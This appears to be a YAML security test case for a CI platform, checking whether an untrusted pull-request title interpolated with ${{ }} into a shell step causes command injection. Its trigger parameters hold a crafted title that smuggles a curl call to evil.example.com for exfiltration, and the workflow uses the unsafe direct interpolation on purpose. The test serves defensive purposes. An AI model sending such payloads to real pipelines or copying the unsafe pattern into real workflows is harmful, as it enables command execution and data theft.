id: SEC-INJECT-03-001
dimensions: [security]
dimension: security
priority: P0
title: "PR 标题中的不可信输入不应通过 ${{ }} 直接插入 run 导致命令注入"
intent_ref: INTENT-SEC-009

setup:
  repo_fixture: with-fork-and-pr-template
  secrets: []
  variables: {}
  branch_protection: default

workflow: |
  on: [pull_request]
  permissions: {}
  jobs:
    inject-check:
      name: (SEC-INJECT-03-001) 验证 PR 标题注入防护
      runs-on: [ubuntu-latest, x64, small]
      steps:
        - name: (SEC-INJECT-03-001) 检出代码
          uses: checkout
        - name: (SEC-INJECT-03-001) 打印 PR 标题（仅用于日志验证）
          run: |
            echo "PR_TITLE: ${{ atomgit.event.pull_request.title }}"
            echo "INJECTION_MARKER_1: no_curl_executed"
        - name: (SEC-INJECT-03-001) 检查注入标记
          if: ${{ always() }}
          run: |
            if grep -q "INJECTION_MARKER_1: no_curl_executed" <<< "$ATOMGIT_STEP_SUMMARY_INPUT" 2>/dev/null; then
              echo "INJECTION_DEFENDED: yes"
            else
              echo "INJECTION_DEFENDED: unknown"
            fi

trigger:
  event: pull_request
  as: untrusted_contributor
  params:
    pr_title: "hello\"; curl -s http://evil.example.com/exfil?data=test; echo \"done"
    pr_body: normal body content

fault_injection: null

assertions:
  - type: negative
    target: step_logs
    eval: deterministic
    rubric: "job 日志中不出现 curl/wget 命令的输出，INJECTION_MARKER_1 显示 no_curl_executed"
  - type: negative
    target: step_logs
    eval: deterministic
    rubric: "PR 标题中的特殊字符不被解释为 shell 命令执行"
  - type: positive
    target: run_status
    eval: deterministic
    rubric: "workflow 正常完成或报明确的安全错误，不因注入崩溃"

teardown:
  reset: fixture
